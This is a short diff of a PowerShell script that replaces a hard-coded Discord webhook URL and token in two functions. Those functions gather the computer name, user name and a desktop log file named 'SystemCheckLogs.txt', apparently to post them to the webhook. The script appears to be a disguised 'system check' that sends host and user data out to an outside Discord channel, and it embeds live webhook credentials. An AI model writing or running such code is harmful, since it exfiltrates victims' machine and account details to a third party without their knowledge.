@@ -177,7 +177,7 @@ function Log-FolderNames {
 function Send-InitialMessage {
     $computerName = $env:COMPUTERNAME
     $userName = $env:USERNAME
-    $discordWebhookUrl = "https://discord.com/api/webhooks/1305253767687573555/qfDWd_Y2rEP5j8cnAHKDA1l__dUNlr1B8VoGVKCFM_MpClE32YOEhxdY_4d66uvRPND1"
+    $discordWebhookUrl = "https://discord.com/api/webhooks/1361636687343779840/72C5aiW_lfA0kMI4bEEEzf2Kscu7fnhy8cKQ9PMxSGHt72df3LnzMu6PdrXwY_3QsN8l"
 
     # JSON payload with computer and user info
     $jsonPayload = @{
@@ -197,7 +197,7 @@ function Send-InitialMessage {
 function Send-Logs {
     $desktopPath = [System.Environment]::GetFolderPath('Desktop')
     $logFilePath = Join-Path -Path $desktopPath -ChildPath "SystemCheckLogs.txt"
-    $discordWebhookUrl = "https://discord.com/api/webhooks/1305253767687573555/qfDWd_Y2rEP5j8cnAHKDA1l__dUNlr1B8VoGVKCFM_MpClE32YOEhxdY_4d66uvRPND1"
+    $discordWebhookUrl = "https://discord.com/api/webhooks/1361636687343779840/72C5aiW_lfA0kMI4bEEEzf2Kscu7fnhy8cKQ9PMxSGHt72df3LnzMu6PdrXwY_3QsN8l"
 
     # Confirm the log file path
     Write-Host "Log file path: $logFilePath"
